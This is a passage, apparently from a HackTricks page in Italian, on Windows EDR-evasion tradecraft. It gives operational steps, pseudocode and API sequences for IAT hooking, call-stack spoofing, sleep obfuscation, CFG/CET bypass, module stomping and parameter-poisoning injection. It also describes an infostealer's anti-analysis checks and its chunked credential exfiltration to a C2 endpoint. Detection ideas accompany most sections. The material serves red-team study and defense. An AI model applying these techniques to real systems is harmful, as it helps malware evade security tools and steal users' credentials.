- Quando la DLL host viene caricata, attraversare il suo IMAGE_IMPORT_DESCRIPTOR e modificare le entry IAT degli import target (ad esempio, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a thin wrapper PIC.
- Ogni wrapper PIC esegue le evasion prima di effettuare il tail-call all'indirizzo della vera API. Le evasion tipiche includono:
- Memory mask/unmask attorno alla chiamata (ad esempio, cifrare le regioni del beacon, RWX→RX, modificare i nomi/permessi delle pagine), quindi ripristinarli dopo la chiamata.
- Call-stack spoofing: costruire uno stack benigno ed effettuare la transizione nell'API target in modo che l'analisi del call stack risolva i frame previsti.
- Per garantire la compatibilità, esportare un'interfaccia affinché uno script Aggressor (o equivalente) possa registrare le API da sottoporre a hooking per Beacon, BOF e DLL di post-exploitation.

Perché usare IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizza l'import sottoposto a hooking, senza modificare il codice del tool o fare affidamento su Beacon per effettuare il proxy di API specifiche.
- Copre le DLL di post-exploitation: eseguire l'hooking di LoadLibrary* consente di intercettare i caricamenti dei moduli (ad esempio, System.Management.Automation.dll, clr.dll) e applicare la stessa evasione di masking/stack alle loro chiamate API.
- Ripristina l'uso affidabile dei comandi di post-exploitation per la creazione di processi contro i meccanismi di rilevamento basati sul call stack, effettuando il wrapping di CreateProcessA/W.

Schema minimo di IAT hook (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo utilizzo dell'import. Reflective loaders come TitanLdr/AceLdr dimostrano l'hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale catturato prima del patching oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per il PIC ed evita di lasciare pagine writable+executable.

Stub di call-stack spoofing
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (indirizzi di ritorno all'interno di moduli benigni) e poi fanno pivot verso la vera API.
- Questo elude le detections che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbina queste tecniche a stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Integrazione operativa
- Anteponi il reflective loader alle DLL post-ex per inizializzare automaticamente il PIC e gli hook quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target, così Beacon e BOFs beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni su detection/DFIR
- Integrità IAT: entry che risolvono a indirizzi non appartenenti a immagini (heap/anon); verifica periodica dei puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno che non appartengono a immagini caricate; transizioni improvvise verso PIC non appartenente a immagini; ancestry di RtlUserThreadStart incoerente.
- Telemetria del loader: scritture in-process sull'IAT, attività precoce del DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se fai hooking di LoadLibrary*, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di memory masking.

Building block ed esempi correlati
- Reflective loaders che eseguono IAT patching durante il caricamento (ad es., TitanLdr, AceLdr)
- Memory masking hooks (ad es., simplehook) e PIC di stack-cutting (stackcutting)
- Stub PIC di call-stack spoofing (ad es., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks tramite un PICO residente

Se controlli un reflective loader, puoi fare hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che controlla prima gli hook:

- Costruisci un **PICO residente** (oggetto PIC persistente) che sopravviva dopo che il PIC transiente del loader si è liberato.
- Esporta una funzione `setup_hooks()` che sovrascriva il resolver degli import del loader (ad es., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, salta gli import ordinali e usa una ricerca degli hook basata su hash come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al link time con le entry Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook rimane valido perché vive all'interno del PICO residente.

Questo produce una **redirezione IAT import-time** senza patchare la sezione di codice della DLL caricata dopo il caricamento.

### Forzare gli import hookable quando il target usa il PEB-walking

Gli hook import-time si attivano solo se la funzione è effettivamente presente nell'IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza una entry di import), forza un import reale affinché il percorso `ProcessImports()` del loader possa intercettarlo:

- Sostituisci la risoluzione degli export tramite hash (ad es., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore emette una entry IAT, consentendo l'interception quando il reflective loader risolve gli import.

### Sleep/idle obfuscation in stile Ekko senza patchare `Sleep()`

Invece di patchare `Sleep`, fai hooking delle primitive effettive di wait/IPC usate dall'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per i wait lunghi, avvolgi la chiamata in una catena di obfuscation in stile Ekko che cifra l'immagine in memoria durante l'inattività:

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` predisposti.
- Catena tipica (x64): imposta l'immagine su `PAGE_READWRITE` → esegui RC4 tramite `advapi32!SystemFunction032` sull'intera immagine mappata → esegui il wait bloccante → esegui la decifratura RC4 → **ripristina i permessi per sezione** percorrendo le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un `CONTEXT` template; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per i wait lunghi (ad es., `WAIT_OBJECT_0`) in modo che il chiamante continui mentre l'immagine è mascherata. Questo pattern nasconde il modulo agli scanner durante le finestre di inattività ed evita la signature classica del `Sleep()` patchato.

Idee per la detection (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` usato su buffer contigui di grandi dimensioni pari a un'immagine.
- `VirtualProtect` su intervalli estesi seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione CFG runtime per i gadget di sleep-obfuscation

Sui target con CFG abilitato, il primo salto indiretto verso un gadget mid-function come `jmp [rbx]` o `jmp rdi` normalmente causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadata CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken all'interno di processi hardened:

- Registra ogni destinazione indiretta usata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entry `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all'interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), il `MEMORY_RANGE_ENTRY` deve iniziare alla **base dell'immagine** e coprire la **dimensione completa dell'immagine**.
- Per regioni mappate manualmente/PIC/stomped, usa invece la **base dell'allocazione** e la dimensione dell'allocazione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscall di wait/event) e qualsiasi sezione executable controllata dall'attacker che diventerà una destinazione indiretta.

Questo trasforma le catene di sleep in stile ROP/JOP da “funzionano solo nei processi non-CFG” a primitive riutilizzabili per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing CET-safe per thread in sleep

La sostituzione completa del `CONTEXT` è rumorosa e può non funzionare sui sistemi CET Shadow Stack, perché un `Rip` spoofed deve comunque essere coerente con lo shadow stack hardware. Un pattern di sleep-masking più sicuro è:

- Scegli un altro thread nello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Cattura il contesto reale del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto spoofed, lasciando intatti lo `Rsp`/lo stato dello stack spoofed.
- Durante la finestra di sleep, copia l'`NT_TIB` del thread spoofed nel TEB corrente affinché gli stack walker eseguano l'unwind all'interno di un intervallo di stack legittimo.
- Al termine del wait, ripristina il TIB originale e il contesto del thread.

Questo preserva un instruction pointer coerente con CET, fuorviando al contempo gli stack walker EDR che si affidano ai metadata dello stack del TEB per validare gli unwind.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue produce troppe signature, la stessa sequenza sleep-encrypt-spoof-restore può essere eseguita da un helper thread sospeso usando APC accodate:

- Crea un helper thread con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC preparati con `NtQueueApcThread` e consumali con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell'heap invece che nello stack dell'helper, per evitare di esaurire lo stack thread predefinito da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l'evento di avvio e bloccare l'esecuzione.
- Sospendi il thread principale prima di ripristinare il TIB/contesto (`NtSuspendThread` → restore → `NtResumeThread`) per ridurre la finestra di race in cui uno scanner potrebbe rilevare uno stack parzialmente ripristinato.

Questo sostituisce la signature `CreateTimerQueueTimer` + `NtContinue` con una signature helper-thread/APC, mantenendo gli stessi obiettivi di RC4 masking e stack spoofing.

Idee aggiuntive per la detection
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, wait o dispatch APC.
- `GetThreadContext`/`SetThreadContext` inseriti attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di signature di gadget brevi come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all'interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata all'interno del processo target** invece di allocare memoria executable privata evidente o caricare una nuova DLL sacrificale. Il target dell'overwrite dovrebbe essere un'**immagine caricata e disk-backed**, il cui spazio di codice possa contenere il payload senza corrompere i code path ancora necessari al processo.

### Selezione affidabile del target

Lo stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola causerà il crash del processo. Un workflow più affidabile è:

1. Enumera i moduli del processo target e mantieni una **include list composta solo dai nomi** delle DLL già caricate.
2. Compila prima il payload e registra la sua **dimensione esatta in byte**.
3. Scansiona le DLL candidate su disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo è più importante della dimensione del file, perché riflette la dimensione della sezione executable **quando viene mappata in memoria**.
4. Analizza l'**Export Address Table (EAT)** e scegli la RVA di una funzione esportata come offset iniziale dello stomp.
5. Calcola il **blast radius**: se il payload supera il boundary della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper tipici per recon/selezione osservati in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Note operative
- Preferisci le DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti imprevisti di immagini.
- Preferisci export eseguiti raramente dall'applicazione target; in caso contrario, i normali percorsi di codice potrebbero raggiungere i byte modificati prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di modificare l'inclusione dello shellcode da una string literal a un **byte-array/braced initializer**, in modo che l'intero buffer sia rappresentato correttamente nel sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in **pagine eseguibili supportate da immagini** (`MEM_IMAGE`, `PAGE_EXECUTE*`) invece delle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file sottostante su disco.
- Thread remoti o pivot del contesto che iniziano l'esecuzione all'interno di un export legittimo di una DLL i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` su pagine `.text` di DLL, seguite dalla creazione di un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia determinati parametri di avvio di `CreateProcessW` nel processo figlio** e li memorizza all'interno di `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).

### Carrier avvelenabili copiati da `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a memoria **scrivibile** per `CreateProcessW` ed è limitato a **32.767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un environment block Unicode costituito da stringhe consecutive `NAME=VALUE\0`, terminate da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi il mapping `ShellInfo` deve essere considerato un dettaglio di implementazione anziché un contratto documentato stabile.

Questo trasforma la normale creazione di processi nella **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che sia Windows a eseguire la copia tra processi.

### Flusso di lookup remoto senza API di scrittura remota

Dopo la creazione del processo figlio, risolvi il buffer copiato usando primitive di sola lettura:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi il `PEB` remoto
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flusso minimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Esecuzione del parameter buffer copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del main thread già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivendo `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il context può essere modificato direttamente sull'handle del main thread restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limitazione dei byte null e staged shellcode

Tutti e tre i carrier sono **dati stringa o simili a stringhe**, quindi un payload raw contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **first stage privo di null** che ricostruisce le costanti a runtime e poi carica un arbitrary second stage.

Un pattern semplice è la sintesi delle costanti basata su XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Questo consente al first stage di creare stringhe per lo stack, argomenti API, percorsi DLL o un loader shellcode di second stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- effettuare il push della stringa/buffer sullo stack del target
- riservare la **shadow space di 32 byte x64**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un second stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, convertito in `PAGE_EXECUTE_READ` con `VirtualProtect` ed eseguito tramite un jump, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri di processo**
- tale modifica della protezione seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` e successivamente di `RTL_USER_PROCESS_PARAMETERS`
- valori di `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` insolitamente lunghi o ad alta entropia durante la creazione del processo

### Note

- P3 è una **tecnica di trasferimento tra processi**, non una primitiva di esecuzione completa di per sé: il parametro copiato necessita comunque di una modifica dei permessi per l'esecuzione e di un metodo di redirezione dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stata considerata dagli autori, ma rifiutata perché raggiunge internamente primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tradecraft di SantaStealer per l'evasione fileless e il credential theft

SantaStealer (aka BluelineStealer) illustra come i moderni info-stealer combinino AV bypass, anti-analysis e credential access in un unico workflow.

### Gating del layout della tastiera e ritardo del sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi di non detonare mai sui locale esclusi e lasciando al contempo un artefatto utile per l'hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica `check_antivm` a più livelli

- La variante A scorre l'elenco dei processi, calcola l'hash di ogni nome con un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà del sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali intorno alle operazioni di sleep per individuare il single-stepping. Qualsiasi rilevamento interrompe l'esecuzione prima dell'avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale incorpora un helper per le credenziali di Chromium che viene scaricato su disco oppure mappato manualmente in memoria; nella modalità fileless risolve autonomamente import e relocation, evitando la scrittura di artefatti dell'helper.
- Questo helper memorizza una DLL di secondo stadio cifrata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Le routine di ChromElevator utilizzano il process hollowing reflective con direct syscall per iniettare il payload in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening di ABE.


### Raccolta modulare in-memory ed esfiltrazione HTTP a chunk

- `create_memory_based_log` itera su una tabella globale di puntatori a funzione `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser e così via). Ogni thread scrive i risultati in buffer condivisi e segnala il numero di file dopo una finestra di join di circa 45 s.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente come `%TEMP%\\Log.zip`. `ThreadPayload1` esegue quindi uno sleep di 15 s e trasmette l'archivio in chunk da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary del browser `multipart/form-data` (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opzionale, mentre l'ultimo chunk aggiunge `complete: true` per informare il C2 che il riassemblaggio è terminato.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
